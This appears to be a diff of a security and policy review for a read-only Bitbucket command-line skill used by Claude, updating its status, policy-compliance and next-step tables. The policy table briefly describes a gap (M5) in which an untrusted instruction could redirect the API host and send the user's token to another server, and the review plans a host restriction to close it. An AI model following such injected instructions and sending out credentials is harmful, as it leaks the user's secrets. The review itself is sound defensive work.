+| L1–L12   | `browse` root, line counts, activity, flags, numbers, …  | Fixed and tested                                                                             |
+| Live checks (L1, L7, L9, L12) | Bitbucket behaviour tested only on the mock | No record that they were done. `92850ef` came from using the skill on a real PR, but its message does not mention these checks |
+| Housekeeping | Commit README, CHANGELOG, package.json, tests        | Done                                                                                         |
 
 ## Policy alignment (managed settings)
 
-| Policy item | Status |
-|---|---|
-| Production systems read-only; no deploy, merge, approve | **Met.** GET-only client with no write commands. SKILL.md instructs Claude to decline write requests and offer draft text instead. |
-| No credentials or secrets in prompts | **Met for the skill's own flow.** Credentials come from the environment and are never echoed. The weak spot is `get` (M1), which can fetch secret-bearing config into context. |
-| Customer data must not be entered into prompts | **Partly mitigated.** SKILL.md warns that PRs, logs and issues can contain customer data and says to summarise rather than dump. This is guidance only; the CLI has no redaction. Pipeline logs (`pipeline-step-log`) are the likeliest place for sensitive output. |
-| Incident reporting for accidental disclosure | **Addressed** in the credentials section of SKILL.md. |
+| Policy item                                                | Status                                                                                                                                                       |
+| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Production systems read-only; never approve, merge, deploy | **Met.** GET-only client with no write commands. SKILL.md tells Claude to decline write requests and offer draft text instead.                                  |
+| No credentials or secrets in prompts                       | **Met for normal use.** **Gaps:** an untrusted instruction can send the token to another host through the environment (M5), and `get` can read secret-bearing endpoints (M1). |
+| No customer data in prompts                                | **Partly mitigated by guidance.** SKILL.md says to summarise rather than dump. The CLI does no redaction; pipeline logs are the likeliest source.               |
+| Incident reporting for accidental disclosure               | **Addressed** in SKILL.md and the README's security notes.                                                                                                    |
+| Claude may propose changes for human review                | **Supported.** Write requests become drafts for the user to post.                                                                                             |
 
-## Recommended order of work
+## Next steps
 
-1. **M1.** Tighten `get` (denylist or allowlist) and drop the `hooks` example.
-2. **M2 and M3.** Fix the timeout scope and surface `e.cause`, with retry on transient network codes.
-3. **M5.** Stop `pr-context` from reporting errors as empty results.
-4. **M4, L1 and the documentation table.** Fix the inaccurate `commits`/`branch` claim, add escaping helpers, and correct SKILL.md.
-5. **Tests.** Make `bb.mjs` importable and add `node --test` coverage for the pure helpers and the paging/retry logic.
-6. **Live verification** of the *(unverified)* items: slash branches in `commits`, the `Accept` header on step logs, range requests, and proxy behaviour on the corporate network.
+1. **M5:** limit the API host to `api.bitbucket.org` and loopback, and refuse to send credentials when `NODE_TLS_REJECT_UNAUTHORIZED=0`. This is a small code change plus two tests, and it closes the most serious remaining gap.
+2. **M6:** document the reversed `<a>..<b>` order in `help`, SKILL.md, the README and mcp-tool-map, and replace `--topic` with a working two-dot option. Add a query-string test.
+3. **M1:** add the `get` denylist and a test.
+4. **L13 and L14:** these two Low items are most likely to mislead Claude in practice.
+5. **Tests** for retries, paging, `comment-thread`, `--select` and `--max-chars`, with a configurable backoff so the suite stays fast.
+6. **Live checks** with a read-only token:
+   - the earlier L1, L7, L9 and L12
+   - the `prs --q 'state=…'` interaction (L19)
+   - one `diff feature..main` call to confirm M6's order on real data
+7. Bump to 1.2.0 and add a CHANGELOG entry that cites these IDs.
